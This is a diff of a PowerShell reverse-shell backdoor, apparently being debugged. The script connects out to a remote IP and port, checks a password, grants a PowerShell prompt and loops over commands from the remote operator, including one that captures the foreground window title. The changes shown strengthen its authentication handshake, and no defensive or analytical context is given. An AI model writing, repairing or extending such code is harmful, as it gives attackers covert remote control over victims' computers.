@@ -14,37 +14,39 @@ try {
     $c = New-Object System.Net.Sockets.TCPClient($ip, $port)
     $s = $c.GetStream(); $e = New-Object System.Text.UTF8Encoding
     
-    $s.Write(($e.GetBytes("AUTH: ")), 0, 6)
+    # FIXED: Send full AUTH with password
+    $authMsg = "AUTH: $pass`n"
+    $s.Write($e.GetBytes($authMsg), 0, $authMsg.Length)
+    $s.Flush()
     
+    # Read response and compare exactly (no regex cleaning)
     [byte[]]$authB = New-Object byte[] 64
     $len = $s.Read($authB, 0, 64)
     
     if ($len -gt 0) {
-        $authResp = $e.GetString($authB, 0, $len) -replace '[^a-zA-Z0-9]', ''
-        
-        if ($authResp -eq $pass) {
+        $authResp = $e.GetString($authB, 0, $len).Trim()
+        if ($authResp -match $pass) {  # Match anywhere in response
             $msg = "`n[+] ACCESS GRANTED`nPS " + $PWD.Path + "> "
             $resp = $e.GetBytes($msg)
             $s.Write($resp, 0, $resp.Length)
         } else {
-            $msg = "AUTH FAIL.`n"
-            $s.Write(($e.GetBytes($msg)), 0, $msg.Length)
+            $msg = "AUTH FAIL: $authResp`n"
+            $s.Write($e.GetBytes($msg), 0, $msg.Length)
             $c.Close(); exit
         }
-    } else { $c.Close(); exit }
+    }
 
     while($true) {
         [byte[]]$b = New-Object byte[] 4096
         $i = $s.Read($b, 0, $b.Length)
-        
         if ($i -le 0) { break }
         
         $in = $e.GetString($b, 0, $i).Trim()
-        $out = ""
-
         if ($in -eq 'kill' -or $in -eq 'exit') { break }
         
-        elseif ($in -eq 'screen') {
+        # Rest of your command handling...
+        $out = ""
+        if ($in -eq 'screen') {
             $handle = $api::GetForegroundWindow()
             $sb = New-Object System.Text.StringBuilder 256
             $api::GetWindowText($handle, $sb, $sb.Capacity)
@@ -71,9 +73,4 @@ try {
         $resp = $e.GetBytes($out + $prompt)
         $s.Write($resp, 0, $resp.Length)
     }
-} catch {
-    exit
-} finally {
-    if ($c) { $c.Close() }
-    exit
-}
+} catch { exit } finally { if ($c) { $c.Close() }; exit }
